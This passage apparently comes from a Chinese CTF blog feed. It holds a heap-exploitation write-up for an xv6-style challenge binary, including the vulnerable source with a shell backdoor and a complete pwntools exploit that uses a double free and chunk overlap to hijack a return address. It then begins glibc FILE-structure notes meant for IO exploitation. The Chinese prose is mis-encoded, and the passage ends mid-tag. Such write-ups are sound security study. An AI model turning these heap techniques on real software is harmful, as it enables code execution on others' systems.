class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">backdoor</span><span class="params">()</span> &#123;</span><br><span class="line"><span class="type">char</span> *argv[] = &#123;<span class="string">&quot;sh&quot;</span>, <span class="number">0</span>&#125;;</span><br><span class="line">exec(<span class="string">&quot;sh&quot;</span>, argv);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">gift</span><span class="params">()</span> &#123;</span><br><span class="line"><span class="keyword">if</span> (chance) &#123;</span><br><span class="line"><span class="keyword">if</span> (record)</span><br><span class="line"><span class="built_in">free</span>(record);</span><br><span class="line">record = <span class="number">0</span>;</span><br><span class="line">chance = <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">banner();</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> choice;</span><br><span class="line"><span class="keyword">while</span> (<span class="number">1</span>) &#123;</span><br><span class="line">menu();</span><br><span class="line"><span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;choice);</span><br><span class="line"><span class="keyword">switch</span> (choice) &#123;</span><br><span class="line"><span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">add();</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">delete();</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> <span class="number">3</span>:</span><br><span class="line">gift();</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>é¢˜ç›®ç»™å‡ºçš„<code>backdoor</code>ï¼Œè€Œä¸”<code>gitf</code>å‡½æ•°åˆ™æ˜¯ç›´æ¥é€äº†ä¸€æ¬¡<code>double free</code><br>ä½†æ˜¯æˆ‘ä»¬ä¸èƒ½ç›´æ¥<code>double free</code>ï¼Œä¸»è¦æœ‰ä¸¤ä¸ªåŸå› ï¼š</p><ul><li>è§‚å¯Ÿåˆ°<code>free</code>å‡½æ•°å‰é¢ä¼šæœ‰ä¸€ä¸ªå¾ªç¯éå†</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span>(p = freep; !(bp &gt; p &amp;&amp; bp &lt; p-&gt;s.ptr); p = p-&gt;s.ptr)</span><br><span class="line">  <span class="keyword">if</span>(p &gt;= p-&gt;s.ptr &amp;&amp; (bp &gt; p || bp &lt; p-&gt;s.ptr))</span><br><span class="line">    <span class="keyword">break</span>;</span><br></pre></td></tr></table></figure><p>å¦‚æœç›´æ¥<code>double free</code>ä¼šç›´æ¥åœ¨è¿™é‡Œè¿›å…¥æ­»å¾ªç¯</p><ul><li><code>ptr</code>æŒ‡é’ˆåœ¨<code>heap</code>çš„å¤´éƒ¨å‰<code>8</code>ä¸ªå­—èŠ‚ï¼Œç›´æ¥<code>double free</code>å¹¶ä¸èƒ½å¯¹èµ·åšä»»ä½•ä¿®æ”¹</li></ul><p>æ‰€ä»¥å¯ä»¥é€‰æ‹©å å †åé€ æˆå †æº¢å‡ºæ‰æœ‰æœºä¼šä¿®æ”¹<code>ptr</code>æŒ‡é’ˆ</p><p>å› ä¸ºè¿™é‡Œçš„å †å—åˆå¹¶æ¡ä»¶éå¸¸ç®€å•ï¼Œæ‰€ä»¥é€ å †å ä¹Ÿå¾ˆç®€å•ï¼Œå…ˆ<code>free</code>ä¸¤ä¸ªç›¸é‚»çš„å †å—è®©ä»–ä»¬åˆå¹¶ï¼ˆä¸‹æ–‡ç§°è¿™ä¸¤ä¸ªå †å—ä¸­ä½åœ°å€çš„å †å—ä¸º<code>a</code>ï¼Œé«˜åœ°å€çš„ä¸º<code>b</code>ï¼‰ï¼Œåˆå¹¶åè¡¨å¤´<code>freep</code>å˜ä¸ºåˆšåˆšé‡Šæ”¾çš„<code>a</code>ï¼Œç„¶å<code>double free</code>å †å—<code>b</code>ï¼Œè¿™ä¸ªæ—¶å€™å› ä¸ºè¡¨å¤´æ˜¯<code>a</code>ï¼Œæ‰€ä»¥ç¬¬ä¸€æ¬¡å¾ªç¯å°±æ»¡è¶³ <code>if(p &gt;= p-&gt;s.ptr &amp;&amp; (bp &gt; p || bp &lt; p-&gt;s.ptr))</code> çš„æ¡ä»¶é€€å‡ºå¾ªç¯ï¼Œè¿™æ—¶åˆå› ä¸º<code>b</code>ä¸ä¹‹å‰<code>a</code>ä¸ç›¸é‚»ï¼ˆåˆå¹¶åå †å—<code>a</code>çš„<code>size</code>å·²è¢«ä¿®æ”¹ä¸ºåˆå¹¶åçš„å¤§å°ï¼‰ï¼Œæ‰€ä»¥ä¸ä¼šè§¦å‘åˆå¹¶ï¼Œè€Œæ˜¯å°†<code>b</code>ç›´æ¥é“¾å…¥é“¾è¡¨ã€‚ç°åœ¨åªéœ€è¦å°†<code>a</code>ç”³è¯·å‡ºæ¥ï¼Œå°±å¯ä»¥å †å åˆ°<code>b</code>è¿›è¡Œéæ³•å†™å…¥ä¿®æ”¹<code>free</code>é“¾è¡¨ä¸Šå †å—<code>b</code>çš„<code>s.ptr</code>ã€‚å› ä¸ºä¹‹å‰åˆå¹¶çš„æ—¶å€™<code>freep</code>è¢«èµ‹å€¼ä¸ºäº†å †å—<code>a</code>ï¼Œè€Œ<code>malloc</code>éå†æ˜¯ä»<code>freep-&gt;s.ptr</code>å¼€å§‹éå†çš„ï¼Œä¸ºäº†ç®€åŒ–åˆ©ç”¨æ¨¡å‹ï¼Œå¯ä»¥å†<code>free</code>ä¸€ä¸ªä½äºä»¥ä¸Šä¸¤ä¸ªä¸”ä¸ç›¸é‚»çš„å †å—æ¥æ›´æ–°<code>freep</code>ï¼Œå°†<code>freep-&gt;s.ptr</code>å˜æˆå †å—<code>a</code>ï¼Œç„¶åä¸‹æ¬¡<code>malloc</code>çš„æ—¶å€™å°±ä¼šä»<code>a</code>å¼€å§‹éå†ã€‚è¿™æ—¶ç”³è¯·å‡º<code>size</code>ä¸º<code>a+b</code>å †å—å°±å¯ä»¥æŠŠä¹‹å‰çš„<code>a</code>ç”³è¯·å‡ºæ¥ï¼Œåˆ©ç”¨å †å å†™<code>b-&gt;s.ptr</code>ä¸ºç›®æ ‡åœ°å€<code>addr</code>ï¼Œå†è¿ç»­åˆ†é…ä¸¤æ¬¡ï¼ˆå…ˆè¦æŠŠ<code>b</code>ç»™ç”³è¯·å‡ºæ¥ï¼‰ï¼Œ<code>malloc</code>å°±ä¼šå°è¯•å°†<code>addr</code>åˆ†é…å‡ºå»ï¼Œè¿™æ—¶å¦‚æœ<code>addr</code>åˆæ³•ï¼ˆåœ°å€åˆæ³•ä¸”<code>size</code>ç¬¦åˆè¦æ±‚ï¼‰å°±ä¼šè¿”å›<code>addr</code>ï¼Œåˆ°è¿™ä¸€æ­¥å°±å®Œæˆäº†å®¹æ˜“åœ°å€åˆ†é…<br>è‡³äºåˆ†é…åˆ°å“ªï¼Œå› ä¸ºç¨‹åºæ˜¯é™æ€é“¾æ¥çš„ï¼Œæ²¡<code>got</code>è¡¨å¯æ‰“ï¼Œæ²¡åŠ¨æ€åº“ä¸­çš„<code>hook</code>å’Œ<code>glibc</code>ä¸­çš„ç»å…¸<code>io</code>å¯æ‰“ï¼Œä¹Ÿæ²¡ä»€ä¹ˆç°æˆçš„å‡½æ•°æŒ‡é’ˆå¯ä»¥åˆ©ç”¨ã€‚æ‰€ä»¥è€ƒè™‘åˆ†é…åˆ°æ ˆä¸ŠåŠ«æŒè¿”å›åœ°å€åˆ°åé—¨ï¼Œå› ä¸ºç³»ç»Ÿæ²¡æœ‰<code>ASLR</code>åŠŸèƒ½ï¼ˆå…¶å®å‡ºé¢˜äººå‡ºåˆ°ä¸€åŠçœ‹åˆ°äº†ä¸€ç¯‡<code>xv6</code>å®ç°<code>ASLR</code>åŠŸèƒ½çš„è®ºæ–‡ï¼Œä½†å› ä¸ºæ—¶é—´æ¯”è¾ƒä»“ä¿ƒæ‰€ä»¥æ²¡æœ‰æŠŠ<code>ASLR</code>åŠ ä¸Šäº†ï¼Œä¹Ÿç®—æ˜¯å˜ç›¸é™ä½äº†éš¾åº¦å§ï¼‰ï¼Œå¯ä»¥é€šè¿‡è°ƒè¯•æ‰¾åˆ°å›ºå®šçš„æ ˆå¸§åœ°å€æ¥åŠ«æŒ<code>add</code>å‡½æ•°çš„è¿”å›åœ°å€ã€‚æœ€åå°±æ˜¯å› ä¸º<code>malloc</code>å‡½æ•°ä¸­è¦<code>size</code>æ»¡è¶³è¦æ±‚æ‰èƒ½å°†ç›®æ ‡åœ°å€<code>addr</code>åˆ†é…å‡ºå»ï¼Œæ‰€ä»¥è¿™é‡Œå¯ä»¥è€ƒè™‘åˆ©ç”¨<code>add</code>å‡½æ•°çš„å±€éƒ¨æ ˆä¸Šå˜é‡<code>size</code>å’Œ<code>idx</code>æ¥æ„é€ åˆæ³•çš„<code>size</code>å°†<code>addr</code>åˆ†é…å‡ºå»ï¼Œè¿™é‡Œç”¨çš„æ˜¯<code>idx</code>ï¼ˆ<code>idx</code>æœ€åä¸º<code>3</code>ï¼Œå¯ä»¥é€šè¿‡ <code>malloc(0x20)</code> åˆ†é…ï¼‰</p><h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p = process(<span class="string">&#x27;./run.sh&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">menu</span>(<span class="params">choice</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;3. ???\n&#x27;</span>, <span class="built_in">str</span>(choice))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">size, content</span>):</span><br><span class="line">    menu(<span class="number">1</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;size: &#x27;</span>, <span class="built_in">str</span>(size))</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;content: &#x27;</span>, content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete</span>(<span class="params">idx</span>):</span><br><span class="line">    menu(<span class="number">2</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;index: &#x27;</span>, <span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">gift</span>():</span><br><span class="line">    menu(<span class="number">3</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x20</span>, <span class="string">&#x27;a&#x27;</span>) <span class="comment"># 0</span></span><br><span class="line">add(<span class="number">0x20</span>, <span class="string">&#x27;a&#x27;</span>) <span class="comment"># 1</span></span><br><span class="line">add(<span class="number">0x20</span>, <span class="string">&#x27;a&#x27;</span>) <span class="comment"># 2</span></span><br><span class="line">add(<span class="number">0x20</span>, <span class="string">&#x27;a&#x27;</span>) <span class="comment"># 3</span></span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">gift()</span><br><span class="line">delete(<span class="number">3</span>)</span><br><span class="line">add(<span class="number">0x50</span>, <span class="string">b&#x27;a&#x27;</span> * <span class="number">0x20</span> + p64(<span class="number">0x3fa4</span>))</span><br><span class="line">add(<span class="number">0x20</span>, <span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">add(<span class="number">0x20</span>, <span class="string">b&#x27;a&#x27;</span> * <span class="number">4</span> + p64(<span class="number">0x2da</span>))</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>é«˜ç‰ˆæœ¬glibcå †åˆ©ç”¨ç¬”è®°</title>
      <link href="/2023/11/13/%E9%AB%98%E7%89%88%E6%9C%ACglibc%E5%A0%86%E5%88%A9%E7%94%A8%E7%AC%94%E8%AE%B0/"/>
      <url>/2023/11/13/%E9%AB%98%E7%89%88%E6%9C%ACglibc%E5%A0%86%E5%88%A9%E7%94%A8%E7%AC%94%E8%AE%B0/</url>
      
        <content type="html"><![CDATA[<p>è¯¥ç¬”è®°ç›®çš„æ˜¯ä¸ºäº†æ–¹ä¾¿è‡ªå·±åšé¢˜ï¼Œæ‰€ä»¥æ¯ä¸ªæ‰“æ³•å†™çš„éå¸¸ç®€ä¾¿ï¼Œä¸”éƒ¨åˆ†å†…å®¹ä¸ºä»å„ä½å¸ˆå‚…çš„æ–‡ç« ä¸­ç›´æ¥å¤åˆ¶ï¼Œæ²¡æœ‰è®°å½•æ›´åŠ æ·±å…¥çš„åŸç†</p><h3 id="éƒ¨åˆ†ç»“æ„æºç "><a href="#éƒ¨åˆ†ç»“æ„æºç " class="headerlink" title="éƒ¨åˆ†ç»“æ„æºç "></a>éƒ¨åˆ†ç»“æ„æºç </h3><h4 id="IO-FILE"><a href="#IO-FILE" class="headerlink" title="_IO_FILE"></a>_IO_FILE</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> _<span class="title">IO_FILE</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="type">int</span> _flags;        <span class="comment">/* High-order word is _IO_MAGIC; rest is flags. */</span></span><br><span class="line"> </span><br><span class="line">  <span class="comment">/* The following pointers correspond to the C++ streambuf protocol. */</span></span><br><span class="line">  <span class="type">char</span> *_IO_read_ptr;    <span class="comment">/* Current read pointer */</span></span><br><span class="line">  <span class="type">char</span> *_IO_read_end;    <span class="comment">/* End of get area. */</span></span><br><span class="line">  <span class="type">char</span> *_IO_read_base;    <span class="comment">/* Start of putback+get area. */</span></span><br><span class="line">  <span class="type">char</span> *_IO_write_base;    <span class="comment">/* Start of put area. */</span></span><br><span class="line">  <span class="type">char</span> *_IO_write_ptr;    <span class="comment">/* Current put pointer. */</span></span><br><span class="line">  <span class="type">char</span> *_IO_write_end;    <span class="comment">/* End of put area. */</span></span><br><span class="line">  <span class="type">char</span> *_IO_buf_base;    <span class="comment">/* Start of reserve area. */</span></span><br><span class="line">  <span class="type">char</span> *_IO_buf_end;    <span class="comment">/* End of reserve area. */</span></span><br><span class="line"> </span><br><span class="line">  <span class="comment">/* The following fields are used to support backing up and undo. */</span></span><br><span class="line">  <span class="type">char</span> *_IO_save_base; <span class="comment">/* Pointer to start of non-current get area. */</span></span><br><span class="line">  <span class="type">char</span> *_IO_backup_base;  <span class="comment">/* Pointer to first valid character of backup area */</span></span><br><span class="line">  <span class="type">char</span> *_IO_save_end; <span class="comment">/* Pointer to end of non-current get area. */</span></span><br><span class="line"> </span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">IO_marker</span> *_<span class="title">markers</span>;</span></span><br><span class="line"> </span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">IO_FILE</span> *_<span class="title">chain</span>;</span></span><br><span class="line"> </span><br><span class="line">  <span class="type">int</span> _fileno;</span><br><span class="line">  <span class="type">int</span> _flags2;</span><br><span class="line">  <span class="type">__off_t</span> _old_offset; <span class="comment">/* This used to be _offset but it&#x27;s too small.  */</span></span><br><span class="line"> </span><br><span class="line">  <span class="comment">/* 1+column number of pbase(); 0 is unknown. */</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">short</span> _cur_column;</span><br><span class="line">  <span class="type">signed</span> <span class="type">char</span> _vtable_offset;</span><br><span class="line">  <span class="type">char</span> _shortbuf[<span class="number">1</span>];</span><br><span class="line"> </span><br><span class="line">  _IO_lock_t *_lock;</span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> _IO_USE_OLD_IO_FILE  <span class="comment">// å¯ä»¥çœ‹å‡ºå¦‚æœä½¿ç”¨æ—§çš„ _IO_FILE ,é‚£æˆ‘ä»¬ç»å¸¸è¯´çš„IOå°±æ˜¯  _IO_FILE_complete</span></span></span><br><span class="line">&#125;;</span><br><span class="line"> </span><br><span class="line"><span class="class"><span class="keyword">struct</span> _<span class="title">IO_FILE_complete</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">IO_FILE</span> _<span class="title">file</span>;</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">  <span class="type">__off64_t</span> _offset;</span><br><span class="line">  <span class="comment">/* Wide character stream stuff.  */</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">IO_codecvt</span> *_<span class="title">codecvt</span>;</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">IO_wide_data</span> *_<span class="title">wide_data</span>;</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">IO_FILE</span> *_<span class="title">freeres_list</span>;</span></span><br><span class="line">  <span class="type">void</span> *_freeres_buf;</span><br><span class="line">  <span class="type">size_t</span> __pad5;</span><br><span class="line">  <span class="type">int</span> _mode;</span><br><span class="line">  <span class="comment">/* Make sure we don&#x27;t get into trouble again.  */</span></span><br><span class="line">  <span class="type">char</span> _unused2[<span class="number">15</span> * <span class="keyword">sizeof</span> (<span class="type">int</span>) - <span class="number">4</span> * <span class="keyword">sizeof</span> (<span class="type">void</span> *) - <span class="keyword">sizeof</span> (<span class="type">size_t</span>)];</span><br><span class="line">&#125;;</span><br><span class="line"> </span><br><span class="line"><span class="class"><span class="keyword">struct</span> _<span class="title">IO_FILE_complete_plus</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">IO_FILE_complete</span> <span class="title">file</span>;</span></span><br><span class="line">  <span class="type">const</span> <span class="class"><span class="keyword">struct</span> _<span class="title">IO_jump_t</span> *<span class="title">vtable</span>;</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h4 id="IO-jump-t"><a href="#IO-jump-t" class="headerlink" title="_IO_jump_t"></a>_IO_jump_t</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> _<span class="title">IO_jump_t</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    JUMP_FIELD(<span class="type">size_t</span>, __dummy);</span><br><span class="line">    JUMP_FIELD(<span class="type">size_t</span>, __dummy2);</span><br><span class="line">    JUMP_FIELD(_IO_finish_t, __finish);</span><br><span class="line">    JUMP_FIELD(_IO_overflow_t, __overflow);</span><br><span class="line">    JUMP_FIELD(_IO_underflow_t, __underflow);</span><br><span class="line">    JUMP_FIELD(_IO_underflow_t, __uflow);</span><br><span class="line">    JUMP_FIELD(_IO_pbackfail_t, __pbackfail);</span><br><span class="line">    <span class="comment">/* showmany */</span></span><br><span class="line">    JUMP_FIELD(_IO_xsputn_t, __xsputn);</span><br><span class="line">    JUMP_FIELD(_IO_xsgetn_t, __xsgetn);</span><br><span class="line">    JUMP_FIELD(_IO_seekoff_t, __seekoff);</span><br><span class="line">    JUMP_FIELD(_IO_seekpos_t, __seekpos);</span><br><span class="line">    JUMP_FIELD(_IO_setbuf_t, __setbuf);</span><br><span class="line">    JUMP_FIELD(_IO_sync_t, __sync);</span><br><span class="line">    JUMP_FIELD(_IO_doallocate_t, __doallocate);</span><br><span class="line">    JUMP_FIELD(_IO_read_t, __read);</span><br><span class="line">    JUMP_FIELD(_IO_write_t, __write);</span><br><span class="line">    JUMP_FIELD(_IO_seek_t, __seek);</span><br><span class="line">    JUMP_FIELD(_IO_close_t, __close);</span><br><span class="line">    JUMP_FIELD(_IO_stat_t, __stat);</span><br><span class="line">    JUMP_FIELD(_IO_showmanyc_t, __showmanyc);</span><br><span class="line">    JUMP_FIELD(_IO_imbue_t, __imbue);</span><br><span class="line">    <span class="meta">#<span class="keyword">if</span> 0</span></span><br><span class="line">    get_column;</span><br><span class="line">    set_column;</span><br><span class="line">    <span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h4 id="struct-IO-wide-data"><a href="#struct-IO-wide-data" class="headerlink" title="struct _IO_wide_data"></a>struct _IO_wide_data</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> _<span class="title">IO_wide_data</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="type">wchar_t</span> *_IO_read_ptr;    <span class="comment">/* Current read pointer */</span></span><br><span class="line">  <span class="type">wchar_t</span> *_IO_read_end;    <span class="comment">/* End of get area. */</span></span><br><span class="line">  <span class="type">wchar_t</span> *_IO_read_base;    <span class="comment">/* Start of putback+get area. */</span></span><br><span class="line">  <span class="type">wchar_t</span> *_IO_write_base;    <span class="comment">/* Start of put area. */</span></span><br><span class="line">  <span class="type">wchar_t</span> *_IO_write_ptr;    <span class="comment">/* Current put pointer. */</span></span><br><span class="line">  <span class="type">wchar_t</span> *_IO_write_end;    <span class="comment">/* End of put area. */</span></span><br><span class="line">  <span class="type">wchar_t</span> *_IO_buf_base;    <span class="comment">/* Start of reserve area. */</span></span><br><span class="line">  <span class="type">wchar_t</span> *_IO_buf_end;        <span class="comment">/* End of reserve area. */</span></span><br><span class="line">  <span class="comment">/* The following fields are used to support backing up and undo. */</span></span><br><span class="line">  <span class="type">wchar_t</span> *_IO_save_base;    <span class="comment">/* Pointer to start of non-current get area. */</span></span><br><span class="line">  <span class="type">wchar_t</span> *_IO_backup_base;    <span class="comment">/* Pointer to first valid character of</span></span><br><span class="line"><span class="comment">                   backup area */</span></span><br><span class="line">  <span class="type">wchar_t</span> *_IO_save_end;    <span class="comment">/* Pointer to end of non-current get area. */</span></span><br><span class="line"> </span><br><span class="line">  <span class="type">__mbstate_t</span> _IO_state;</span><br><span class="line">  <span class="type">__mbstate_t</span> _IO_last_state;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">IO_codecvt</span> _<span class="title">codecvt</span>;</span></span><br><span class="line">  <span class="type">wchar_t</span> _shortbuf[<span class="number">1</span>];</span><br><span class="line">  <span class="type">const</span> <span class="class"><span class="keyword">struct</span> _<span class="title">IO_jump_t</span> *_<span class="title">wide_vtable</span>;</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h4 id="IO-wfile-jumps"><a href="#IO-wfile-jumps" class="headerlink" title="_IO_wfile_jumps"></a>_IO_wfile_jumps</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">const</span> <span class="class"><span class="keyword">struct</span> _<span class="title">IO_jump_t</span> _<span class="title">IO_wfile_jumps</span> <span class="title">libio_vtable</span> =</span></span><br><span class="line">&#123;</span><br><span class="line">  JUMP_INIT_DUMMY,</span><br><span class="line">  JUMP_INIT(finish, _IO_new_file_finish),</span><br><span class="line">  JUMP_INIT(overflow, (_IO_overflow_t) _IO_wfile_overflow),</span><br><span class="line">  JUMP_INIT(underflow, (_IO_underflow_t) _IO_wfile_underflow),</span><br><span class="line">  JUMP_INIT(uflow, (_IO_underflow_t) _IO_wdefault_uflow),</span><br><span class="line">  JUMP_INIT(pbackfail, (_IO_pbackfail_t) _IO_wdefault_pbackfail),</span><br><span class="line">  JUMP_INIT(xsputn, _IO_wfile_xsputn),</span><br><span class="line">  JUMP_INIT(xsgetn, _IO_file_xsgetn),</span><br><span class="line">  JUMP_INIT(seekoff, _IO_wfile_seekoff),</span><br><span class="line">  JUMP_INIT(seekpos, _IO_default_seekpos),</span><br><span class="line">  JUMP_INIT(setbuf, _IO_new_file_setbuf),</span><br><span class="line">  JUMP_INIT(sync, (_IO_sync_t) _IO_wfile_sync),</span><br><span class="line">  JUMP_INIT(doallocate, _IO_wfile_doallocate),</span><br><span class="line">  JUMP_INIT(read, _IO_file_read),</span><br><span class="line">  JUMP_INIT(write, _IO_new_file_write),</span><br><span class="line">  JUMP_INIT(seek, _IO_file_seek),</span><br><span class="line">  JUMP_INIT(close, _IO_file_close),</span><br><span class="line">  JUMP_INIT(stat, _IO_file_stat),</span><br><span class="line">  JUMP_INIT(showmanyc, _IO_default_showmanyc),</span><br><span class="line">  JUMP_INIT(imbue, _IO_default_imbue)</span><br><span class="line">&#125;;</span><br><span class="line">libc_hidden_data_def (_IO_wfile_jumps)</span><br></pre></td></tr></table></figure><h4 id="IO-printf-buffer-as-file-jumps"><a href="#IO-printf-buffer-as-file-jumps" class="headerlink" title="_IO_printf_buffer_as_file_jumps"></a>_IO_printf_buffer_as_file_jumps</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">const</span> <span class="class"><span class="keyword">struct</span> _<span class="title">IO_jump_t</span> _<span class="title">IO_printf_buffer_as_file_jumps</span> <span class="title">libio_vtable</span> =</span></span><br><span class="line">&#123;</span><br><span class="line">  JUMP_INIT_DUMMY,</span><br><span class="line">  JUMP_INIT(finish, <span class="literal">NULL</span>),</span><br><span class="line">  JUMP_INIT(overflow, __printf_buffer_as_file_overflow),<span class="comment">//å‡½æ•°ä¸€</span></span><br><span class="line">  JUMP_INIT(underflow, <span class="literal">NULL</span>),</span><br><span class="line">  JUMP_INIT(uflow, <span class="literal">NULL</span>),</span><br><span class="line">  JUMP_INIT(pbackfail, <span class="literal">NULL</span>),</span><br><span class="line">  JUMP_INIT(xsputn, __printf_buffer_as_file_xsputn),<span 